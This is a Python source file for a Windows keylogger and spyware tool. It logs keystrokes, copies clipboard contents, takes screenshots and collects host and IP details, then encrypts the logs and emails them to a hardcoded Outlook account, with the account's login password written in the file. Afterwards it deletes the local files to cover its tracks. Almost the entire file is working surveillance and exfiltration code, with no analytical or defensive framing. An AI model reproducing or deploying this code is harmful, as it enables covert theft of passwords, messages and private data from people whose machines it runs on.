from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import process, freeze_support
from PIL import ImageGrab

open('keyLog.txt', 'w')
keyInformation = "keyLog.txt"
systemInformation = "sysInfo.txt"
clipboardInformation = "clipboard.txt"
screenshotInformation = "screenshot.png"

keysInformationE = "keylogE.txt"
systemInformationE = "systemInformationE.txt"
clipboardE = "clipboardE.txt"

emailAddress = "faisalolaimi2412@outlook.com"
password = "olaimi3242"

username = getpass.getuser()

toAddr = "faisalolaimi2412@outlook.com"

encryptionKey = "QlT8--4EzKjeh-Xp53BzktfBqGuuyas69Cyo6XdjZ-E="

filePath = os.getcwd()
extend = "\\"
fileMarge = filePath + extend


def sendEmail(filename, attachment, toAddr):
    fromAddr = emailAddress

    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['TO'] = toAddr
    msg['Subject'] = 'Log file'

    body = "bodyOfTheMail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.office365.com', 587)
    s.starttls()
    s.login(fromAddr, password)
    text = msg.as_string()
    s.sendmail(fromAddr, toAddr, text)

    s.quit()

sendEmail(keyInformation,filePath+extend+keyInformation,toAddr)

def computerInformation():
    with open(filePath + extend + systemInformation, "a") as f:
        hostname = socket.gethostname()
        ipAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address" + "\n")

        f.write("Private IP Address: " + ipAddr + "\n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")


computerInformation()


def copyClipboard():
    with open(filePath + extend + clipboardInformation, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipborad data: \n" + pastedData)
        except:
            f.write("Clipborad cloud be not copied")


copyClipboard()


def screenshot():
    im = ImageGrab.grab()
    im.save(filePath + extend + screenshotInformation)


screenshot()

numberOfIterations = 0
numberOfIterationsEnd = 3
timeIteration = 15  # secound
currentTime = time.time()
stoppingTime = time.time() + timeIteration

while numberOfIterations < numberOfIterationsEnd:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeFile(keys)
            keys = []


    def writeFile(keys):
        with open(filePath + extend + keyInformation, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\t")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime < stoppingTime:
        with open(filePath + extend + keyInformation, "w") as f:
            f.write(" ")

        screenshot()
        sendEmail(screenshotInformation, filePath + extend + screenshotInformation, toAddr)
        copyClipboard()

        numberOfIterations += 1
        currentTime = time.time()
        stoppingTime: float = time.time() + timeIteration

filesToEncrypt = [fileMarge + systemInformation, fileMarge + clipboardInformation, fileMarge+ keyInformation]
encryptedFileNames = [fileMarge + systemInformationE, fileMarge + clipboardE, fileMarge+ keysInformationE]

count = 0

for encryptingFile in filesToEncrypt:
    with open(filesToEncrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(encryptionKey)
    encrypted = fernet.encrypt(data)

    with open(encryptedFileNames[count], 'wb') as f:
        f.write(encrypted)

    sendEmail(encryptedFileNames[count], encryptedFileNames[count], toAddr)
    count += 1

time.sleep(120)

delete_files = [systemInformation, clipboardInformation, keyInformation, screenshotInformation]
for file in delete_files:
    os.remove(fileMarge + file)
    #state of palestine
    #free palestine
    #state of palastine palestine 123
    #123 1233 123
#faisal hasan fadi